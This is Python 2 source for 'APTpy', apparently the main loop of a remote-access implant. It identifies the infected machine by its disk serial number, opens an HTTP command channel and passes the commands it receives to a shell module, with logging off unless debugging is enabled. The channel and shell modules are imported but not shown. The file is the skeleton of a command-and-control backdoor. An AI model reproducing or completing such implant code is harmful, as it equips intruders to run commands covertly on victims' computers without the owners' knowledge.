import logging
import logging.handlers
import Queue
from threading import Event
from time import sleep
from platform import system as platform_system
DEBUG = True


class APTpy:
    def __init__(self):
        self.client_id = None
        self.channel = None
        self.modules = []
        self.queue_send = Queue.Queue()
        self.queue_recv = Queue.Queue()
        self.events = {}

        # Logging information
        aptpy_logger = logging.getLogger('aptpy')
        aptpy_logger.setLevel(logging.DEBUG)

        # Create a rotation logging, so we won't have and endless file
        if DEBUG:
            rotate = logging.handlers.RotatingFileHandler('aptpy.log', maxBytes=(5 * 1024 * 1024), backupCount=3)
            rotate.setLevel(logging.DEBUG)
            rotate.setFormatter(logging.Formatter('%(asctime)s|%(levelname)-8s| %(message)s', '%Y-%m-%d %H:%M:%S'))

            aptpy_logger.addHandler(rotate)

        console = logging.StreamHandler()
        console.setLevel(logging.DEBUG)

        console.setFormatter(logging.Formatter("%(asctime)s|%(levelname)-8s| %(message)s", '%Y-%m-%d %H:%M:%S'))
        aptpy_logger.addHandler(console)

        aptpy_logger.disabled = True

        if DEBUG:
            aptpy_logger.disabled = False

    def run(self):
        logger = logging.getLogger('aptpy')

        self._checkenv()

        logger.debug("Registering channels")
        self._registerChannels()

        logger.debug("Registering modules")
        self._registerModules()

        logger.debug("Starting channel connection")
        self.channel.start()

        logger.debug("Starting all modules")
        for module in self.modules:
            module.start()

        try:
            logger.debug("Starting main loop")
            while True:
                sleep(0.5)

                if not self.queue_recv.empty():
                    cmd = self.queue_recv.get().strip()

                    logger.info("Got command %s from the queue" % cmd)

                    self.queue_recv.task_done()

                    for module in self.modules:
                        if module.its_for_me(cmd):
                            className = module.__class__.__name__

                            logger.info("Module %s reclaimed the message" % className)

                            self.events[className].set()
                            self.events[className].clear()
        except BaseException as inner_e:
            logger.debug("Exception detected, try to stop all threads before bubbling up")

            self.channel.halt()
            self.channel.join()

            for module in self.modules:
                className = module.__class__.__name__
                module.halt()

                self.events[className].set()
                self.events[className].clear()

                module.join()

            raise inner_e

    def _checkenv(self):
        if platform_system() == 'Darwin':
            import subprocess
            temp = subprocess.check_output(["ioreg -rd1 -w0 -c AppleAHCIDiskDriver | grep Serial"], shell=True)
            # '      "Serial Number" = "            XXXXXXXX"'
            temp = temp.strip().split('=')[1]
            disk = temp.replace('"', '').strip()
        else:
            from wmi import WMI
            info = WMI()
            disk = info.Win32_PhysicalMedia()[0].SerialNumber.strip()

        self.client_id = disk

    def _registerChannels(self):
        from lib.channels.http import HttpChannel

        self.channel = HttpChannel(self.client_id, self.queue_send, self.queue_recv)

    def _registerModules(self):
        from lib.modules.shell import ShellModule

        self.events['ShellModule'] = Event()
        self.modules.append(ShellModule(self.queue_send, self.events['ShellModule']))

try:
    obj = APTpy()
    obj.run()
except BaseException as e:
    if DEBUG:
        print "[!] Operation aborted: " + str(type(e).__name__) + str(e.message)
